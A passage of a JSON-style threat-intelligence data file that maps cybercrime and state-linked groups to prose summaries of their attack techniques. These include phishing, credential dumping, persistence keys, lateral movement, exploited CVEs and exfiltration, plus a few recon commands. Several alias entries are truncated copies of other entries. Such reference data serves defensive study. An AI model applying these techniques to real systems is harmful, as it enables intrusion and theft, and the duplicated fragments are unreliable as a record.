    "EXOTIC LILY": "EXOTIC LILY is a financially motivated group that has been closely linked with Wizard Spider and the deployment of ransomware including Conti and Diavol. EXOTIC LILY may be acting as an initial access broker for other malicious actors, and has targeted a wide range of industries including IT, cybersecurity, and healthcare since at least September 2021., EXOTIC LILY has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to '.us', '.co' or '.biz'., EXOTIC LILY has established social media profiles to mimic employees of targeted companies., EXOTIC LILY has created e-mail accounts to spoof targeted organizations., EXOTIC LILY has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML., EXOTIC LILY has gathered targeted individuals' e-mail addresses through open source research and website contact forms., EXOTIC LILY conducted an e-mail thread-hijacking campaign with malicious ISO attachments., EXOTIC LILY has relied on victims to open malicious links in e-mails for execution., EXOTIC LILY has used the e-mail notification features of legitimate file sharing services for spearphishing., EXOTIC LILY has searched for information on targeted individuals on business databases including RocketReach and CrunchBase., EXOTIC LILY has copied data from social media sites to impersonate targeted individuals., EXOTIC LILY has used contact forms on victim websites to generate phishing e-mails., EXOTIC LILY  has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive., EXOTIC LILY has used malicious links to lure users into executing malicious payloads., EXOTIC LILY has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO., EXOTIC LILY has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.",
    "Ferocious Kitten": "Ferocious Kitten is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015., Ferocious Kitten has acquired domains imitating legitimate sites., Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones., Ferocious Kitten has named malicious files update.exe and loaded them into the compromise host's 'Public' folder., Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon., Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments., Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.",
    "FIN10": "FIN10 is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. , FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key., FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence., FIN10 has executed malicious .bat files containing PowerShell commands., FIN10 has used batch scripts and scheduled tasks to delete critical system files., FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally., FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments., FIN10 has used RDP to move laterally to systems in the victim environment., FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire., FIN10 has used Meterpreter to enumerate users on remote systems., FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor., FIN10 has moved laterally using the Local Administrator account.",
    "FIN13": "FIN13 is a financially motivated cyber threat group that has targeted the financial, retail, and hospitality industries in Mexico and Latin America, as early as 2016. FIN13 achieves its objectives by stealing intellectual property, financial data, mergers and acquisition information, or PII., , FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation., FIN13 has enumerated all users and their roles from a victim's main treasury system., FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs., FIN13 has assigned newly created accounts the sysadmin role to maintain persistence., FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data., FIN13 has compressed the dump output of compromised credentials with a 7zip binary., FIN13 has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE/SOFTWARE/WOW6432Node/Microsoft/Windows/CurrentVersion/Run/hosts to maintain persistence., FIN13 has used PowerShell commands to obtain DNS data from a compromised network., FIN13 has leveraged xp_cmdshell and Windows Command Shell to execute commands on a compromised machine. FIN13 has also attempted to leverage the ‘xp_cmdshell’ SQL procedure to execute remote commands on internal MS-SQL servers., FIN13 has used VBS scripts for code execution on comrpomised machines., FIN13 has created MS-SQL local accounts in a compromised network., FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration., FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money., FIN13 has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: C:/Windows/Temp and /tmp., FIN13 has utilized certutil to decode base64 encoded versions of custom malware., FIN13 has utilized custom malware to maintain persistence in a compromised environment., FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access., FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN)., FIN13 has used the Windows dir command to enumerate files and directories in a victim's network., FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions., FIN13 has researched employees to target for social engineering attacks., FIN13 has searched for infrastructure that can provide remote access to an environment for targeting efforts., FIN13 has created hidden files and folders within a compromised Linux system /tmp directory. FIN13 also has used attrib.exe to hide gathered local host information., FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507)., FIN13 has downloaded additional tools and malware to compromised systems., FIN13 has logged the keystrokes of victims to escalate privileges., FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file., FIN13 has used scheduled tasks names such as acrotyr and AppServicesr to mimic the same names in a compromised network's C:/Windows directory., FIN13 has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war., FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications. , FIN13 has utilized nmap for reconnaissance efforts. FIN13 has also scanned for internal MS-SQL servers in a compromised network., FIN13 has executed net view commands for enumeration of open shares on compromised machines., FIN13 has utilized publicly available tools such as Mimikatz, Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts., FIN13 has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz., FIN13 has extracted the SAM and SYSTEM registry hives using the reg.exe binary for obtaining password hashes from a compromised machine., FIN13 has harvested the NTDS.DIT file and leveraged the Impacket tool on the compromised domain controller to locally decrypt it., FIN13 has enumerated all users and roles from a victim's main treasury system., FIN13 has utilized web shells and Java tools for tunneling capabilities to and from compromised assets., FIN13 has utilized a proxy tool to communicate between compromised assets., FIN13 has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement., FIN13 has leveraged SMB to move laterally within a compromised network via application servers and SQL servers., FIN13 has remotely accessed compromised environments via secure shell (SSH) for lateral movement., FIN13 has leveraged WMI to move laterally within a compromised network via application servers and SQL servers., FIN13 has created scheduled tasks in the C:/Windows directory of the compromised network. , FIN13 has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server., FIN13 has collected local host information by utilizing Windows commands systeminfo, fsutil, and fsinfo. FIN13 has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information., FIN13 has used nslookup and ipconfig for network reconnaissance efforts. FIN13 has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information., FIN13 has used Ping and tracert for network reconnaissance efforts., FIN13 has used netstat and other net  commands for network reconnaissance efforts., FIN13 has obtained administrative credentials by browsing through local files on a compromised machine., FIN13 has used the PowerShell utility Invoke-SMBExec to execute the pass the hash method for lateral movement within an compromised environment., FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access., FIN13 has utilized WMI to execute commands and move laterally on compromised Windows machines.",
    "Elephant Beetle": "FIN13 has enumerated all users and their roles from a victim's main treasury system., FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs., FIN13 has assigned newly created accounts the sysadmin role to maintain persistence., FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data., FIN13 has compressed the dump output of compromised credentials with a 7zip binary., FIN13 has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE/SOFTWARE/WOW6432Node/Microsoft/Windows/CurrentVersion/Run/hosts to maintain persistence., FIN13 has used PowerShell commands to obtain DNS data from a compromised network., FIN13 has leveraged xp_cmdshell and Windows Command Shell to execute commands on a compromised machine. FIN13 has also attempted to leverage the ‘xp_cmdshell’ SQL procedure to execute remote commands on internal MS-SQL servers., FIN13 has used VBS scripts for code execution on comrpomised machines., FIN13 has created MS-SQL local accounts in a compromised network., FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration., FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money., FIN13 has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: C:/Windows/Temp and /tmp., FIN13 has utilized certutil to decode base64 encoded versions of custom malware., FIN13 has utilized custom malware to maintain persistence in a compromised environment., FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access., FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN)., FIN13 has used the Windows dir command to enumerate files and directories in a victim's network., FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions., FIN13 has researched employees to target for social engineering attacks., FIN13 has searched for infrastructure that can provide remote access to an environment for targeting efforts.",
    "FIN4": "FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013. FIN4 is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence., FIN4 has used HTTP POST requests to transmit data., FIN4 has used VBA macros to display a dialog box and collect victim credentials., FIN4 has accessed and hijacked online email communications using stolen credentials., FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as 'hacked,' 'phish,' and 'malware' in a likely attempt to prevent organizations from communicating about their activities., FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger., FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials., FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros., FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links., FIN4 has used Tor to log in to victims' email accounts., FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts)., FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts)., FIN4 has used legitimate credentials to hijack email communications.",
    "FIN5": "FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian.   , FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results., FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials., FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results., FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment., FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment., FIN5 has cleared event logs from victims., FIN5 uses SDelete to clean up the environment and attempt to prevent detection., FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor., FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel., FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets., FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
    "FIN6": "FIN6 is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors., , , , , , FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges., FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database., Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration., FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation., FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button., FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD., FIN6 has extracted password hashes from ntds.dit to crack offline., FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files., FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener., FIN6 has used kill.bat script to disable security tools., FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites., FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP., FIN6 has used the Stealer One credential stealer to target web browsers., FIN6 has collected schemas and user accounts from systems running SQL Server., FIN6 has collected and exfiltrated payment card data from compromised systems., FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration., FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers., FIN6 has sent stolen payment card data to remote servers via HTTP POSTs., FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges., FIN6 has deployed a utility script named kill.bat to disable anti-virus., FIN6 has removed files from victim machines., FIN6 has renamed the 'psexec' service name to 'mstdc' to masquerade as a legitimate Windows service. , FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS., FIN6 has used Metasploit Bind and Reverse TCP stagers., FIN6 has used encoded PowerShell commands., FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind., FIN6 has used Windows Credential Editor for credential dumping. , FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database. , FIN6 has targeted victims with e-mails containing malicious attachments., FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets., FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers., FIN6 used RDP to move laterally in victim networks., FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS., FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS., FIN6 has used Comodo code-signing certificates. , FIN6 has created Windows services to execute encoded PowerShell commands., FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts., To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes., FIN6 has used Pastebin and Google Storage to host content for their operations. , FIN6 has used WMI to automate the remote execution of PowerShell scripts.",
    "ITG08": "FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation., FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button., FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD., FIN6 has extracted password hashes from ntds.dit to crack offline., FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files., FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener., FIN6 has used kill.bat script to disable security tools., FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites., FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP., FIN6 has used the Stealer One credential stealer to target web browsers., FIN6 has collected schemas and user accounts from systems running SQL Server., FIN6 has collected and exfiltrated payment card data from compromised systems., FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration., FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers., FIN6 has sent stolen payment card data to remote servers via HTTP POSTs., FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.",
    "FIN7": "FIN7 is a financially-motivated threat group that has been active since 2013. FIN7 has primarily targeted the retail, restaurant, hospitality, software, consulting, financial services, medical equipment, cloud services, media, food and beverage, transportation, and utilities industries in the U.S. A portion of FIN7 was run out of a front company called Combi Security and often used point-of-sale malware for targeting efforts. Since 2020, FIN7 shifted operations to a big game hunting (BGH) approach including use of REvil ransomware and their own Ransomware as a Service (RaaS), Darkside. FIN7 may be linked to the Carbanak Group, but there appears to be several groups using Carbanak malware and are therefore tracked separately., , ITG14 shares campaign overlap with FIN7., , , , FIN7 has registered look-alike domains for use in phishing campaigns., FIN7 has set up Amazon S3 buckets to host trojanized digital products., FIN7 has performed C2 using DNS via A, OPT, and TXT records., FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder., FIN7 used SQL scripts to help perform tasks on the victim's machine., FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload., FIN7 used the command prompt to launch commands on the victim’s machine., FIN7 used VBS scripts to help perform tasks on the victim's machine., FIN7 used JavaScript scripts to help perform tasks on the victim's machine., FIN7 created new Windows services and added them to the startup directories for persistence., FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware., FIN7 has collected files and other sensitive information from a compromised network., FIN7 has developed malware for use in operations, including the creation of infected removable media., FIN7 has used application shim databases for persistence., FIN7 has exfiltrated stolen data to the MEGA file sharing site., FIN7 has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange., FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers., FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails., FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload. , FIN7 spear phishing campaigns have included malicious Word documents with DDE execution., FIN7 has created a scheduled task named 'AdobeFlashSync' to establish persistence., FIN7 has attempted to run Darkside ransomware with the filename sleep.exe., FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2., FIN7 has used random junk code to obfuscate malware code., FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands., FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts., FIN7 has used the command net group 'domain admins' /domain to enumerate domain groups., FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached., FIN7 has conducted broad phishing campaigns using malicious links., FIN7 has utilized the remote management tool Atera to download malware to a compromised system., FIN7 has used RDP to move laterally in victim environments., FIN7 has used SSH to move laterally through victim environments., FIN7 has used TightVNC to control compromised hosts., FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations., FIN7 malware has created scheduled tasks to establish persistence., FIN7 captured screenshots and desktop video recordings., FIN7 has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3., FIN7 has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products., FIN7 has used Kerberoasting PowerShell commands such as, Invoke-Kerberoast for credential access and to enable lateral movement., FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls., FIN7 has gained initial access by compromising a victim's software supply chain., FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems., FIN7 has used rundll32.exe to execute malware on a compromised network. , FIN7 has used the command cmd.exe /C quser to collect user session information., FIN7 has used malicious links to lure victims into downloading malware., FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file., FIN7 has harvested valid administrative credentials for lateral movement., FIN7 has used compromised credentials for access as SYSTEM on Exchange servers., FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment., FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes., FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2., FIN7 has used WMI to install malware on targeted systems.",
    "GOLD NIAGARA": "ITG14 shares campaign overlap with FIN7., , , , FIN7 has registered look-alike domains for use in phishing campaigns., FIN7 has set up Amazon S3 buckets to host trojanized digital products., FIN7 has performed C2 using DNS via A, OPT, and TXT records., FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder., FIN7 used SQL scripts to help perform tasks on the victim's machine., FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload., FIN7 used the command prompt to launch commands on the victim’s machine., FIN7 used VBS scripts to help perform tasks on the victim's machine., FIN7 used JavaScript scripts to help perform tasks on the victim's machine., FIN7 created new Windows services and added them to the startup directories for persistence., FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware., FIN7 has collected files and other sensitive information from a compromised network., FIN7 has developed malware for use in operations, including the creation of infected removable media., FIN7 has used application shim databases for persistence., FIN7 has exfiltrated stolen data to the MEGA file sharing site., FIN7 has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange., FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers., FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails., FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload. , FIN7 spear phishing campaigns have included malicious Word documents with DDE execution., FIN7 has created a scheduled task named 'AdobeFlashSync' to establish persistence., FIN7 has attempted to run Darkside ransomware with the filename sleep.exe., FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2., FIN7 has used random junk code to obfuscate malware code., FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands., FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts., FIN7 has used the command net group 'domain admins' /domain to enumerate domain groups., FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached., FIN7 has conducted broad phishing campaigns using malicious links.",
    "Carbon Spider": "FIN7 has used random junk code to obfuscate malware code., FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands., FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts., FIN7 has used the command net group 'domain admins' /domain to enumerate domain groups., FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached., FIN7 has conducted broad phishing campaigns using malicious links., FIN7 has utilized the remote management tool Atera to download malware to a compromised system., FIN7 has used RDP to move laterally in victim environments., FIN7 has used SSH to move laterally through victim environments., FIN7 has used TightVNC to control compromised hosts., FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations., FIN7 malware has created scheduled tasks to establish persistence., FIN7 captured screenshots and desktop video recordings., FIN7 has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3., FIN7 has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products., FIN7 has used Kerberoasting PowerShell commands such as, Invoke-Kerberoast for credential access and to enable lateral movement., FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls., FIN7 has gained initial access by compromising a victim's software supply chain., FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems., FIN7 has used rundll32.exe to execute malware on a compromised network. , FIN7 has used the command cmd.exe /C quser to collect user session information., FIN7 has used malicious links to lure victims into downloading malware., FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file., FIN7 has harvested valid administrative credentials for lateral movement., FIN7 has used compromised credentials for access as SYSTEM on Exchange servers., FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment., FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes",
    "FIN8": "FIN8 is a financially motivated threat group that has been active since at least January 2016, and known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemical, and financial sectors. In June 2021, security researchers detected FIN8 switching from targeting point-of-sale (POS) devices to distributing a number of ransomware variants., , FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token., FIN8 has used HTTPS for command and control., FIN8 has used RAR to compress collected data before exfiltration., FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access., FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via cmd.exe., FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks., FIN8 aggregates staged data from a network into a single location., FIN8 has retrieved a list of trusted domains by using nltest.exe /domain_trusts., FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure., FIN8 has used WMI event subscriptions for persistence., FIN8 has used FTP to exfiltrate collected data., FIN8 has exploited the CVE-2016-0167 local vulnerability., FIN8 has cleared logs during post compromise cleanup activities., FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines., FIN8 has used remote code execution to download subsequent payloads., FIN8 has deleted Registry keys during post compromise cleanup activities., FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads., FIN8 has used open-source tools such as Impacket for targeting efforts., FIN8 has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers., FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE)., FIN8 has distributed targeted emails containing Word documents with embedded malicious macros., FIN8 has distributed targeted emails containing links to malicious documents with embedded macros., FIN8 has injected malicious code into a new svchost.exe process., FIN8 has used RDP for lateral movement., FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. FIN8 has also used smbexec from the Impacket suite for lateral movement., FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers., FIN8 has used scheduled tasks to maintain RDP backdoors., FIN8 has used Registry keys to detect and avoid executing in potential sandboxes., FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader., FIN8 has used the Ping command to check connectivity to actor-controlled C2 servers. , FIN8 has executed the command quser to display the session details of a compromised machine. , FIN8 has used emails with malicious links to lure victims into installing malware., FIN8 has used malicious e-mail attachments to lure victims into executing malware., FIN8 has used valid accounts for persistence and lateral movement., FIN8 has used sslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control., FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities.",
    "Syssphinx": " FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token., FIN8 has used HTTPS for command and control., FIN8 has used RAR to compress collected data before exfiltration., FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access., FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via cmd.exe., FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks., FIN8 aggregates staged data from a network into a single location., FIN8 has retrieved a list of trusted domains by using nltest.exe /domain_trusts., FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure., FIN8 has used WMI event subscriptions for persistence., FIN8 has used FTP to exfiltrate collected data., FIN8 has exploited the CVE-2016-0167 local vulnerability., FIN8 has cleared logs during post compromise cleanup activities., FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines., FIN8 has used remote code execution to download subsequent payloads., FIN8 has deleted Registry keys during post compromise cleanup activities., FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads., FIN8 has used open-source tools such as Impacket for targeting efforts., FIN8 has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers., FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE)., FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.",
    "Fox Kitten": "Fox Kitten is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. Fox Kitten has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering., , , , , , Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts., Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts., Fox Kitten has used 7-Zip to archive data., Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets., Fox Kitten has brute forced RDP credentials., Fox Kitten has used a Perl reverse shell to communicate with C2., Fox Kitten has used PowerShell scripts to access credential data., Fox Kitten has used cmd.exe likely as a password changing mechanism., Fox Kitten has created a local user account with administrator privileges., Fox Kitten has used scripts to access credential information from the KeePass database., Fox Kitten has obtained files from the victim's cloud storage instances., Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information., Fox Kitten has searched local system resources to access sensitive documents., Fox Kitten has searched network shares to access sensitive documents., Fox Kitten has created KeyBase accounts to communicate with ransomware victims., Fox Kitten has used a Twitter account to communicate with ransomware victims., Fox Kitten has used sticky keys to launch a command prompt., Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances., Fox Kitten has exploited known vulnerabilities in remote services including RDP., Fox Kitten has used WizTree to obtain network files and directory listings., Fox Kitten has downloaded additional tools including PsExec directly to endpoints., Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate., Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate., Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports., Fox Kitten has base64 encoded scripts to avoid detection., Fox 